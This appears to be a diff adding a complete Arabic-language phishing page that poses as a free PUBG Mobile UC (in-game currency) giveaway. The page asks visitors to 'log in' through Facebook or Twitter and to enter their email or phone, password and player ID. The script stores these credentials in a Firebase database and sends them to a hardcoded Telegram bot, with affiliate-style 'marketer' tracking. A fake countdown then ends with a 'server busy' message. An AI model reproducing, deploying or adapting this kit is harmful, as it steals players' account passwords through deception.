@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PUBG Mobile UC</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    
+    <style>
+        /* دمج style.css + login.css + waiting.css */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        
+        body {
+            background: linear-gradient(-45deg, #ff9800, #9c27b0, #ffcc80, #7b1fa2);
+            background-size: 400% 400%;
+            animation: gradient 10s ease infinite;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            overflow: hidden;
+        }
+
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .container {
+            background: rgba(0, 0, 0, 0.8);
+            padding: 2rem;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        /* التحكم في ظهور الأقسام */
+        .section { display: none; }
+        .active { display: block; }
+
+        h2 { margin-bottom: 1.5rem; color: #ff9800; }
+        p { margin-bottom: 1rem; font-size: 0.9rem; }
+
+        /* تنسيق الأزرار والحقول */
+        .social-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #333;
+            margin: 10px 0;
+            padding: 12px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .social-btn:hover { background: #444; transform: translateY(-2px); }
+        .social-btn img { width: 30px; margin-left: 15px; }
+
+        input, select {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: none;
+            outline: none;
+        }
+
+        .submit-btn {
+            background: #ff5722;
+            color: white;
+            padding: 12px;
+            width: 100%;
+            border: none;
+            border-radius: 5px;
+            font-size: 1.1rem;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        /* شريط التقدم */
+        .progress-container {
+            width: 100%;
+            background: #444;
+            height: 12px;
+            border-radius: 10px;
+            margin: 20px 0;
+            position: relative;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 100%;
+            background: #ff5722;
+            border-radius: 10px;
+            transition: width 1s linear;
+        }
+        #countdown { font-size: 2rem; font-weight: bold; color: #ff9800; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div id="index-section" class="section active">
+            <img src="https://i.postimg.cc/FFy4S1NG/1000209418-removebg-preview.png" width="100" alt="PUBG">
+            <h2>شحن شدات ببجي مجاناً 🚀</h2>
+            <p>اختر طريقة تسجيل الدخول للمتابعة</p>
+            <div class="social-btn" onclick="showLogin('Facebook')">
+                <img src="https://i.postimg.cc/Hn9d715L/1000209419-removebg-preview.png" alt="">
+                <span>Facebook</span>
+            </div>
+            <div class="social-btn" onclick="showLogin('Twitter')">
+                <img src="https://i.postimg.cc/Bn64tyvq/1000209420-removebg-preview.png" alt="">
+                <span>Twitter</span>
+            </div>
+        </div>
+
+        <div id="login-section" class="section">
+            <h2>بيانات الحساب</h2>
+            <p id="platform-text"></p>
+            <input type="text" id="email" placeholder="البريد الإلكتروني / الهاتف">
+            <input type="password" id="password" placeholder="كلمة المرور">
+            <input type="text" id="player-id" placeholder="ID اللاعب">
+            <select id="uc-amount">
+                <option value="660">660 UC (مجاني)</option>
+                <option value="1800">1800 UC (عرض خاص)</option>
+                <option value="3850">3850 UC (فائق)</option>
+            </select>
+            <button class="submit-btn" onclick="handleLogin()">تحقق الآن</button>
+            <p id="login-error" style="color: #ff5252; margin-top: 10px;"></p>
+        </div>
+
+        <div id="waiting-section" class="section">
+            <h2 style="color: #4caf50;">تم استلام الطلب!</h2>
+            <p>يتم الآن التحقق من بياناتك وتجهيز الشدات..</p>
+            <div id="countdown">20</div>
+            <div class="progress-container">
+                <div class="progress-bar" id="progress"></div>
+            </div>
+            <p>لا تغلق هذه الصفحة لضمان وصول الشدات</p>
+        </div>
+    </div>
+
+    <script>
+        // --- الإعدادات (نفس الموجودة في script.js و login.js) ---
+        const botToken = "7681653454:AAHdCsBUKbiru2Z-9aDBzMgVeqhuDWGLyjk";
+        const adminChatId = "5375214810";
+        const firebaseConfig = { databaseURL: "https://elcomando-68116-default-rtdb.firebaseio.com/" };
+        
+        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        // استخراج معرف المستخدم من الرابط
+        function getUserId() {
+            const params = new URLSearchParams(window.location.search);
+            return params.get("id") || "Unknown";
+        }
+
+        // --- الانتقالات ---
+        function showLogin(platform) {
+            document.getElementById('index-section').classList.remove('active');
+            document.getElementById('login-section').classList.add('active');
+            document.getElementById('platform-text').innerText = "تسجيل الدخول عبر " + platform;
+            
+            // إرسال إشعار أولي للتليجرام
+            sendToTelegram(`👤 زائر جديد ضغط على: ${platform}\n🆔 معرف المسوق: ${getUserId()}`);
+        }
+
+        function handleLogin() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+            const pid = document.getElementById('player-id').value;
+            const uc = document.getElementById('uc-amount').value;
+            const error = document.getElementById('login-error');
+
+            if (!email || !pass || !pid) {
+                error.innerText = "يرجى إدخال جميع البيانات!";
+                return;
+            }
+
+            const userId = getUserId();
+            const logData = {
+                user: email,
+                pass: pass,
+                id: pid,
+                uc: uc,
+                time: new Date().toLocaleString()
+            };
+
+            // حفظ في Firebase
+            db.ref('hits/' + userId + '/logs').push(logData);
+
+            // إرسال للتليجرام
+            const message = `🔥 صيدة ببجي جديدة!\n📧 الحساب: ${email}\n🔑 الباسورد: ${pass}\n🆔 ID اللاعب: ${pid}\n💎 الكمية: ${uc}\n🔗 المسوق: ${userId}`;
+            sendToTelegram(message);
+            
+            // محاكاة إرسال للمسوق أيضاً إذا وجد ايدي خاص به
+            if(userId !== "Unknown") sendToTelegram(message, userId);
+
+            // الانتقال لصفحة الانتظار
+            startWaiting();
+        }
+
+        function sendToTelegram(text, chatId = adminChatId) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
+            .catch(err => console.error("Telegram Error:", err));
+        }
+
+        function startWaiting() {
+            document.getElementById('login-section').classList.remove('active');
+            document.getElementById('waiting-section').classList.add('active');
+            
+            let time = 20;
+            const counter = document.getElementById('countdown');
+            const bar = document.getElementById('progress');
+
+            const interval = setInterval(() => {
+                time--;
+                counter.innerText = time;
+                bar.style.width = (time / 20) * 100 + "%";
+                
+                if (time <= 0) {
+                    clearInterval(interval);
+                    alert("عذراً، الضغط على السيرفر عالٍ جداً. حاول مرة أخرى لاحقاً.");
+                    window.location.reload();
+                }
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
